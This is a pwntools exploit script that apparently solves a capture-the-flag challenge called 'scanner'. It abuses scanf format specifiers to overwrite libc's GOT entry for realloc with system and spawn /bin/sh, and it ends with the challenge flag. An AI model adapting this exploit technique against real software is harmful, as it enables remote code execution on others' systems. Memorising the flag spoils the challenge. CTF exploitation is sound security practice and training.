from pwn import *


# explained in the blog
def getAddr(addr):
    STDOUT = (libc.sym["_IO_2_1_stdout_"] >> (8 * 2) & 0xff)
    print(hex(BYTE), hex(STDOUT))
    BASE = BYTE - STDOUT 
    ADDR_BYTE = BASE + (addr >> (8 * 2) & 0xff)
    return (ADDR_BYTE << 16) + (addr & 0x00ffff)

elf = context.binary = ELF("scanner")
context.log_level = "ERROR"

while True:
    p = process()
    # p = remote("scanfun.harkonnen.b01lersc.tf", 8443, ssl=True)

    p.recvuntil("no more [")
    BYTE = int(p.recvuntil("]")[2:-1], 16)

    libc = elf.libc

    p.recvuntil(" scan?")
    # make scanf allocate a block using mmap
    p.sendline(b'%16$ms')
    p.sendline(b'a' * 0x40000)

    # override the got table, realloc -> system 
    p.recvuntil(" scan?")
    p.sendline("%16$3c")                                # block offset in the stack, just write 3 bytes
    p.sendline(getAddr(libc.got["realloc"]).to_bytes(3, byteorder="little"))

    p.recvuntil(" scan?")
    p.sendline("%18$3c")                                # addr that points to our realloc 
    p.sendline(getAddr(libc.sym["system"]).to_bytes(3, byteorder="little"))

    print("OK")
    # make scanf use realloc on /bin/sh
    p.sendline(b'%23$ms')                               # try allocating mem
    p.sendline(b"/bin/sh\x00" + b"A" * 0x100)           # open shell

    A = p.clean(1)
    print(A)
    if b"/bin/sh" in A:
        p.interactive()
    else:
        p.close()                                       # can fail, due to stack args

# bctf{bUt_wh0_sc4nfs_the_5canf3r5_psof2s}
